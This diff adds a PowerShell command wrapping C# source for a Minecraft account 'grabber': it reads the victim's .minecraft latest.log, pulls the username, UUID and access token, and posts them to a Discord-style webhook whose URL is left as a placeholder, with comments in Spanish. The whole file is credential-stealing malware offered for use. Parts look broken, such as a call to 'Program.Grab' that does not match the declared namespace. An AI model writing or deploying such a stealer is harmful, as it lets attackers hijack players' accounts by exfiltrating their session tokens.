@@ -1,0 +1,94 @@
+powershell -c "Add-Type -TypeDefinition @'
+using System;
+using System.IO;
+using System.Net;
+using System.Collections.Specialized;
+
+namespace MC_Grabber
+{
+    internal class Grab
+    {
+        public string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        public string user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+        public NameValueCollection datacollection = new NameValueCollection();
+
+        internal void Minecraft(string webhookurl)
+        {
+            string SessionID = "";
+            string token = "";
+            string uuid = "";
+            string username = "";
+            // Ruta al archivo de registro de Minecraft
+            string path = Path.Combine(appdata, @".minecraft\logs\latest.log");
+
+            try
+            {
+                // Verifica si el archivo de registro existe
+                if (File.Exists(path))
+                {
+                    string[] content = File.ReadAllLines(path); // Usar ReadAllLines para procesar línea por línea
+
+                    foreach (string line in content)
+                    {
+                        // Extracción del nombre de usuario
+                        if (line.Contains("User:") && !line.Contains("Logging in with UUID")) // Evitar líneas de UUID
+                        {
+                            // Asumiendo que el formato es algo como: [timestamp] [info] User: <username>
+                            int startIndex = line.IndexOf("User:") + "User:".Length;
+                            if (startIndex > 0)
+                            {
+                                username = line.Substring(startIndex).Trim();
+                            }
+                        }
+
+                        // Extracción de SessionID, UUID y Token
+                        // Asumiendo un formato como: [timestamp] [info] Logging in with UUID <uuid> for <username> at <ip> using Access Token <token>
+                        if (line.Contains("Access Token"))
+                        {
+                            // Ejemplo de línea: [10:30:00] [INFO] Logging in with UUID 123e4567-e89b-12d3-a456-426614174000 for PlayerName at 192.168.1.100 using Access Token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjNlNDU2Ny1lODliLTFkMy1hNDU2LTQyNjYxNDE3NDAwMCIsInBwcmVmZXJyZWRfbmFtZSI6IlBsYXllck5hbWUiLCJpYXQiOjE2NzgwODk4MDAsImV4cCI6MTY3ODA5MzQwMH0.abcdefg
+                            
+                            // Extracción del UUID
+                            int uuidStartIndex = line.IndexOf("UUID ") + "UUID ".Length;
+                            int uuidEndIndex = line.IndexOf(" for ");
+                            if (uuidStartIndex > 0 && uuidEndIndex > uuidStartIndex)
+                            {
+                                uuid = line.Substring(uuidStartIndex, uuidEndIndex - uuidStartIndex).Trim();
+                            }
+
+                            // Extracción del Token
+                            int tokenStartIndex = line.IndexOf("Access Token ") + "Access Token ".Length;
+                            if (tokenStartIndex > 0)
+                            {
+                                token = line.Substring(tokenStartIndex).Trim();
+                                // El SessionID a menudo se deriva del token o se puede encontrar en otra parte.
+                                // Si el SessionID se puede extraer de una línea diferente o de una manera específica, ajusta aquí.
+                                // Por ahora, si el token es lo que necesitas, úsalo. Si SessionID es diferente, se necesitaría más contexto.
+                                SessionID = token; // Asumiendo que el token es lo que se busca como SessionID o que se puede derivar.
+                            }
+                        }
+                    }
+
+                    // Construcción del mensaje para el webhook
+                    string contentMessage = $"--> Minecraft Grab Results <--\n**Session ID : {SessionID}\nUsername : {username}\nUUID : {uuid}\nAccess Token : **{token}\n\n--> Lunar Grab Results <--";
+                    datacollection.Add("content", contentMessage);
+
+                    // Envío de datos al webhook
+                    using (WebClient client = new WebClient())
+                    {
+                        client.UploadValues(webhookurl, "POST", datacollection);
+                        Console.WriteLine("Datos enviados exitosamente."); // Mensaje de confirmación
+                    }
+                }
+                else
+                {
+                    Console.WriteLine($"Error: El archivo de registro no se encontró en {path}");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Ocurrió un error: {ex.Message}");
+            }
+        }
+    }
+}
+'@; new-object Program.Grab().Minecraft('TU_WEBHOOK_URL_AQUI')"
